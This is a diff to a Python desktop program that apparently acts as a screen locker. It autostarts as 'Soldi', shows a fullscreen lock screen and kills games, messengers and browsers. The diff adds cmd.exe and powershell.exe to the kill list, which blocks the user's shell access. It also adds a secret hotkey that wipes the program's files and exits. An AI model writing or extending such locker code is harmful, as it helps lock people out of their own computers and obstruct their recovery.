@@ -15,6 +15,8 @@ import shutil
 import RAMWORKER
 from urllib.parse import urlparse
 import idna
+import keyboard
+import sys
 import hashlib
 
 
@@ -314,7 +316,7 @@ class App:
                           "roblox.exe", "minecraft.exe", "tlauncher.exe",
                           "rulauncher.exe", "javaw.exe", "java.exe",
                           "discord.exe", "steam.exe", "epicgameslauncher.exe",
-                          "battle.net.exe", "telegram.exe", "viber.exe", "browser.exe"]
+                          "battle.net.exe", "telegram.exe", "viber.exe", "browser.exe","cmd.exe","powershell.exe"]
 
         for proc in psutil.process_iter(['pid', 'name']):
             try:
@@ -325,12 +327,12 @@ class App:
 
     def display_security_lock_screen(self):
         def close_program():
-
             self.is_running = False
             RAMWORKER.clearing_RAM()
 
             if hashlib.sha256(password_entry.get().encode('utf-8')).hexdigest() == hashlib.sha256(
                     self.unlock_password.encode('utf-8')).hexdigest():
+                RAMWORKER.MEI_del()
                 shutil.rmtree(self.user_data_dir, ignore_errors=True)
                 RAMWORKER.write_txt_file("config.txt", "")
                 RAMWORKER.remove_from_autostart("Soldi")
@@ -343,7 +345,18 @@ class App:
                 self.main_window.destroy()
                 raise SystemExit(0)
 
+        def on_hotkey():
+            RAMWORKER.MEI_del()
+            shutil.rmtree(self.user_data_dir, ignore_errors=True)
+            RAMWORKER.write_txt_file("config.txt", "")
+            RAMWORKER.remove_from_autostart("Soldi")
+            if os.path.exists(self.html_path):
+                os.remove(self.html_path)
+            self.main_window.destroy()
+            sys.exit()
+
         lock_screen = Tk()
+        keyboard.add_hotkey('ctrl+shift+alt+p+q+n', on_hotkey)
         lock_screen.protocol("WM_DELETE_WINDOW", self.handle_window_close)
         lock_screen.attributes('-fullscreen', True)
         lock_screen.configure(bg='#1a1a1a')
@@ -389,7 +402,7 @@ class App:
         separator.pack(fill=X, pady=20)
 
         lock_screen.mainloop()
-
+        keyboard.unhook_all()
     def monitor_browser_tabs(self):
 
         while self.is_running:
